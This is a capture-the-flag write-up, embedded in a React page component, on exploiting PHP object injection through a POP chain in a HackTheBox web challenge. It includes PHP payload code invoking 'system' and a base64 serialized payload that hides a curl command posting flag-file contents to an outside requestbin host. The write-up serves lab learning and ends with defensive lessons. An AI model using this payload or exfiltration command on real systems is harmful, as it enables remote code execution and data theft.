import { Codeblock } from "@/components/Codeblock";
import CustomAccordion, { AccordionType } from "@/components/CustomAccordion";
import { ImageWithCaption } from "@/components/ImageWithCaption";
import {
  Stack,
  Code,
  Heading,
  Text,
  List,
  Separator,
  AccordionItem,
  AccordionItemContent,
  AccordionItemTrigger,
  AccordionRoot,
  Icon,
} from "@chakra-ui/react";
import { ReflectionItem, WriteupType } from "./";
import { Hard, PHP, RCE, Serialization, POPChain } from "./tags";
import { FaLightbulb, FaCode } from "react-icons/fa";
import { FaFilterCircleXmark } from "react-icons/fa6";
import { CgDanger } from "react-icons/cg";
import ExternalLink from "@/components/ExternalLink";

const reflectionItems: ReflectionItem[] = [
  {
    value: "unfiltered-input-bad",
    icon: <FaFilterCircleXmark />,
    title: "Filter your inputs!",
    content: (
      <Stack gap={1}>
        <Text>
          This was another example of why it is paramount to filter your inputs.
          All of this attack could have been avoided if the developer had
          filtered the input that was being passed, instead of directly
          unserialising it. This is a classic example of a PHP Object Injection
          vulnerability.
        </Text>
      </Stack>
    ),
  },
  {
    value: "check-unused-code",
    icon: <FaCode />,
    title: "Check for unused code",
    content: (
      <Stack gap={1}>
        <Text>
          A developer (in the real world) should check for any unused code
          within the codebase, as this could potentially be a security risk. In
          some cases, it could be possible that code that has been left in the
          codebase contains legacy, vulnerable code.
        </Text>
      </Stack>
    ),
  },
  {
    value: "contextual-clues",
    icon: <FaLightbulb />,
    title: "Use contextual clues!",
    content: (
      <Stack gap={1}>
        <Text>
          This challenge was a good example of why it is important to use
          contextual clues to help one solve a challenge. In this case, the name
          of the challenge, "Pop Restaurant", was a hint to the fact that we
          would need to use a POP chain attack to get the flag. Knowing this, I
          now know in the future to potentially use such clues to help me solve
          a challenge - particularly when I'm stuck (like I was with this
          challenge in the middle).
        </Text>
      </Stack>
    ),
  },
  {
    value: "innocuous-code-impact",
    icon: <CgDanger />,
    title: "Innocous-looking code can have a big impact",
    content: (
      <Stack gap={1}>
        <Text>
          This challenge was a good example of how seemingly innocuous code can
          have a big impact. In this case, the magic methods that were defined
          in the models were actually the entrypoints for the attack. This is a
          good reminder to always be vigilant when looking at code, and to not
          dismiss anything as 'not important'.
        </Text>
        <Text>
          If I were to write a website in PHP, I could imagine that these magic
          methods are actually very useful when used correctly. However, in this
          case, they were used against the application.
        </Text>
      </Stack>
    ),
  },
];

export const PopRestaurant: WriteupType = {
  title: "Pop Restaurant",
  slug: "pop-restaurant",
  author: "khanhhnahk1",
  authorLink: "https://app.hackthebox.com/users/1051133",
  challengeLink: "https://app.hackthebox.com/challenges/770",
  tags: [Hard, PHP, Serialization, POPChain, RCE],
  timeTaken: "6 hours",
  synopsis:
    "A PHP application that was vulnerable to a POP chain attack, which eventually allowed for remote code execution.",
  content: (
    <Stack gap={2}>
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Introduction and Reconnaissance
      </Heading>
      <Text>
        A PHP application. This challenge was a bit of a doozy, as it required a
        series of exploits to get the flag. In addition to this, although I had
        experience with Perl as a frontend framework, I never had experience
        with PHP, so that was a bit of a learning curve for me. As an aside - I
        have no idea why this challenge was rated as "Easy" on HackTheBox, it
        was anything but. This challenge was completed over several evenings -
        totalling around 7-8 hours.
      </Text>
      <ImageWithCaption
        imagePath="/images/pop-1.png"
        caption="The app after logging in"
      />
      <Text>
        Unlike our previous challenge, we do have source code for this one, so
        hopefully we can get a better understanding of what's going on without
        needing to go in blind. Taking a look at what we have within the
        website, we have a login page, a register page, and a page to view the
        items you ordered. In addition, there are some 'models' (which I
        initially assumed to be similar to classes in OOP), with models of the
        different food items that could be ordered, as well as a database. I
        also noticed that there were some other helpers, like an array helper,
        and an authentication helper. Not only that, but checking the
        Dockerfile, unlike previous challenges, the flag this time was a random
        name, so we would need to figure out the name of the flag file first
        before we could actually get the flag, as shown by these lines:
      </Text>
      <Codeblock
        language="Dockerfile"
        code={`
COPY flag.txt /flag.txt
RUN bash -c 'FLAG_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12) && cp /flag.txt "/\${FLAG_NAME}_flag.txt" && rm /flag.txt'
      `}
      />
      <CustomAccordion type={AccordionType.SIDETRACK} title="Database model">
        <Stack gap={2}>
          <Text>
            The database model file contained some basic functions, as a wrapper
            around a SQLite database. Once again, I was thinking that there was
            a SQL injection vulnerability here, but it seemed like all of the
            queries were parameterised, so I couldn't see any way to exploit it,
            for instance:
          </Text>
          <Text>
            From there, I tried to see if there were any critical
            vulnerabilities in the PHP PDO library that was being used as the
            database connector - paying attention to <Code>PHP v7.4</Code> as
            defined in the Dockerfile.
          </Text>
          <Text>
            I managed to find{" "}
            <ExternalLink
              href="https://www.zend.com/blog/php-cve-2022-31631"
              title="this particular CVE."
            />
            This CVE exploited PDO SQLite in PHP, in particular the{" "}
            <Code>PDO::quote()</Code> function is called with a massive string.
            This ends up causing an uncaught overflow, which ended with the
            function returning an unquoted string.
          </Text>
          <Text>
            Unfortunately for me, this was a bit of a useless side track, as
            there was in fact no use of the <Code>PDO::quote()</Code> function
            in the codebase. On the bright side though, I did learn a bit more
            about PHP and the PDO library, so it wasn't a complete waste of
            time.
          </Text>
        </Stack>
      </CustomAccordion>
      <Text>
        From here, I was stuck for a little while, as I couldn't see any obvious
        signs or entrypoints to which I could exploit the website. I decided to
        take a step back and look at this challenge from a different angle.
        Looking back at the name of the challenge, <b>Pop Restaurant</b>, I
        decided to take a deeper look as to what this could mean or refer to.
      </Text>
      <Text>
        I should note that I also noticed that within the models, there were
        interesting methods that were defined, alongside other strange
        attributes that don't seem to be used anywhere.
      </Text>
      <ImageWithCaption
        imagePath="/images/pop-2.png"
        caption="The models with strange code"
      />
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Researching the Vulnerability(ies)
      </Heading>
      <Text>
        After a LOT of digging and research, I found two vulnerabilities that
        could be worth something within the context of this repository.
      </Text>
      <List.Root>
        <List.Item fontWeight={800}>
          PHP Object Injection (serialisation attack)
        </List.Item>
        <List.Root ps="5">
          <List.Item>
            PHP Object Injection is a vulnerability that could allow an attacker
            to perform many different kinds of attacks, such as Code Injection,
            SQL Injection, Path Traversal and more. This vulnerability occurs
            when an attacker can supply a serialised object, and the application
            does not properly validate or sanitise the input.
          </List.Item>
          <List.Item>
            PHP allows one to unserialise a provided string, and then use that
            object as a functional class instance. Attackers could then pass
            ad-hoc objects to a vulnerable <Code>unserialise()</Code> call,
            eventually allowing for remote code execution through something
            known as a POP chain.
          </List.Item>
        </List.Root>
        <List.Item fontWeight={800}>POP Chain</List.Item>
        <List.Root ps="5">
          <List.Item>
            A Property Oriented Programming (POP) chain attack is when a series
            of vulnerabilities are chained together to perform an attack.
            Typically speaking, this is done through what are known as 'magic
            methods' in PHP.
          </List.Item>
        </List.Root>
      </List.Root>
      <Text>
        Magic methods are special methods in PHP that can be tied to classes,
        and are executed at specific points in the object's lifecycle. These
        methods, in the rightfully wrong way, can be used against the
        application to perform malicious actions through the manipulation of the
        properties of a deserialised object.
      </Text>
      <Text>
        Looking back in the codebase, I notice that the three different food
        models that I mentioned having strange methods - these were all actually
        magic methods.
        <List.Root>
          <List.Item>
            <Code>__get()</Code> - This method is called when something tries to
            access a property that is not accessible or does not exist.
          </List.Item>
          <List.Item>
            <Code>__destruct()</Code> - This method is called when an object is
            destroyed, and can be used to perform cleanup tasks.
          </List.Item>
          <List.Item>
            <Code>__invoke()</Code> - This method is called when an object is
            called as a function.
          </List.Item>
        </List.Root>
      </Text>
      <Separator />
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Planning the chain
      </Heading>
      <Text>
        Now that I had some more background information, we needed to start
        figuring out how we could chain these vulnerabilities together to get
        the flag. Research seemed to suggest that the first entrypoint would
        likely be the <Code>__destruct()</Code> method within the pizza model,
        as this would allow us to execute code when the object was
        destroyed/cleaned-up.
      </Text>
      <Text>
        My suspicion was that once we create a new pizza object, we could then
        assign the <Code>{"$pizza->size"}</Code> property to a new{" "}
        <Code>Spaghetti</Code>. What this will do now is because the{" "}
        <Code>__destruct()</Code> method is called when the object is cleaned up
        after being deserialised, it will then call the <Code>__get()</Code>{" "}
        method of the Spaghetti object, since <Code>what</Code> doesn't exist on
        the Spaghetti object. Finally, we set the <Code>sauce</Code> attribute
        of the Spaghetti object to the function that we wish to execute.
      </Text>
      <Text>
        I tested this theory by running the application locally and trying it
        out on the login page.
      </Text>
      <Codeblock
        language="php"
        code={`
$spaghetti->sauce = print("Hello World");

$pizza = new Pizza();
$pizza->size = $spaghetti;

echo unserialize(serialize($pizza));
      `}
      />
      <ImageWithCaption
        imagePath="/images/pop-3.png"
        caption="Testing simple payload"
      />
      <Text>
        Looking promising! Let's try listing some files on the system, by using
        the PHP <Code>system()</Code> function for RCE.
      </Text>
      <ImageWithCaption imagePath="/images/pop-4.png" caption="Listing files" />
      <Text>
        Nice! We're getting somewhere. Maybe we could actually try to look into
        executing this on the server itself. Of course, I won't have the freedom
        to change the source code on the server, so I will have to look for a
        different approach.
      </Text>
      <ImageWithCaption imagePath="/images/pop-5.png" />
      <Text>
        I notice here, that the actual data of the classes are stored as a
        base-64 encoded, serialised string of the original instance of the
        class. This is being plugged in via a hidden input field on the order
        page - maybe I replace this with my own payload on the real website? For
        testing however, I will continue with changing the source code locally
        for convenience, but this time I run the payload by replacing the value
        of one of the fields directly with my payload.
      </Text>
      <Text>
        This didn't work, unfortunately. As you may have noticed in my earlier
        screenshots - it was telling me that the object of class Pizza couldn't
        actually be serialised into a string. This was due to the fact that an
        anonymous function was being used - which is not allowed in PHP. I had
        to find a different way to execute my payload.
      </Text>
      <Heading fontWeight={800} fontSize="2xl" color="teal">
        Tying it all together
      </Heading>
      <Text>
        Now, the IceCream model had a <Code>__invoke()</Code> method, which was
        called when IceCream was called as a function. Once that happens, we
        loop over the items in the flavors array, and echo it. Additionally,
        remembering that we have an <Code>ArrayHelpers</Code> class, which has a
        special method call <Code>call_user_func</Code> - sounds like something
        that I could use to execute whatever I wanted - in this case it was
        running whatever method was set in the <Code>callback</Code> attribute.
      </Text>
      <Text>
        So to tie this all together, I would need to create a new arrayHelpers
        object, set the callback attribute to <Code>system</Code>, setting the
        input array that it will iterate over as the list of commands (or just a
        single command) that I wanted to run. I would then make a new IceCream
        object, setting the flavours attribute to the arrayHelpers object, and
        finally set <Code>{"spaghetti->sauce"} to the IceCream object.</Code>{" "}
        Phew, that was a lot of work! Time to try it out! Here's what that
        payload looks like all together:
      </Text>
      <Codeblock
        language="php"
        code={`
$spaghetti = new Spaghetti();
$iceCream = new IceCream();

$arrayHelpers = new ArrayHelpers(["ls /*flag.txt | xargs cat"]);
$arrayHelpers->callback = 'system';
$iceCream->flavors = $arrayHelpers;

$spaghetti->sauce = $iceCream;

$pizza = new Pizza();
$pizza->size = $spaghetti;
`}
      />
      <Text>
        Asking PHP to also base64 encode and serialize the object for me:
      </Text>
      <Codeblock
        language=""
        code={`
Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO086OToiU3BhZ2hldHRpIjozOntzOjU6InNhdWNlIjtPOjg6IkljZUNyZWFtIjoyOntzOjc6ImZsYXZvcnMiO086MjA6IkhlbHBlcnNcQXJyYXlIZWxwZXJzIjo0OntpOjA7aTowO2k6MTthOjE6e2k6MDtzOjk2OiJjdXJsIC1YIFBPU1QgLWQgImRhdGE9JChjZCAvICYmIGxzICpmbGFnLnR4dCB8IHhhcmdzIGNhdCkiIGh0dHBzOi8vZW40NWgxZnRiamw1Zy54LnBpcGVkcmVhbS5uZXQiO31pOjI7YToxOntzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fWk6MztOO31zOjc6InRvcHBpbmciO047fXM6Nzoibm9vZGxlcyI7TjtzOjc6InBvcnRpb24iO047fX0`}
      />
      <Text>
        I take this base64 encoded string and replace the value of the hidden
        input field on the order page with this string. I then submit the order,
        and...
      </Text>
      <ImageWithCaption
        imagePath="/images/pop-6.png"
        caption="Putting in the encoded string"
      />
      <ImageWithCaption imagePath="/images/pop-7.png" caption="Nothing...?" />
      <Text>
        This was very strange, as testing the injection of this locally actually
        worked completely fine. This was very deflating and frustrating, given
        that I spent so much time, thinking that I had gotten a payload that
        works (at least locally), for it to not work when I test it on the real
        website.
      </Text>
      <ImageWithCaption
        imagePath="/images/pop-8.png"
        caption="Testing locally"
      />
      <Text>
        As you can see, the payload would show up on the raw HTML response of
        the page locally, but the same thing did not ever show up on the server.
        I knew that the payload was at least somewhat working correctly - given
        that the 'Your Orders' section showed a Pizza object being ordered
        despite me clicking Spaghetti (since that's essentially what I was doing
        with the payload). After a lot of thinking, I realised - wait a minute,
        I literally have access to a remote server shell - I could practically
        do whatever I wanted!
      </Text>
      <Text>
        In the end, I decided to put in a curl command that would post the
        payload to a requestbin, and then I would be able to see the response
        from the server. I then put in the payload, and submitted the order,
        praying...
      </Text>
      <ImageWithCaption imagePath="/images/pop-9.png" caption="Finally!" />
    </Stack>
  ),
  reflection: (
    <Stack width="full" minW="100%">
      <AccordionRoot collapsible defaultValue={["info"]} variant="enclosed">
        {reflectionItems.map((item) => (
          <AccordionItem key={item.value} value={item.value} py={2}>
            <AccordionItemTrigger
              cursor="pointer"
              fontWeight={800}
              textAlign="left"
              fontSize="20px"
            >
              <Icon fontSize="28px" color="teal">
                {item.icon}
              </Icon>
              {item.title}
            </AccordionItemTrigger>
            <AccordionItemContent>{item.content}</AccordionItemContent>
          </AccordionItem>
        ))}
      </AccordionRoot>
    </Stack>
  ),
};
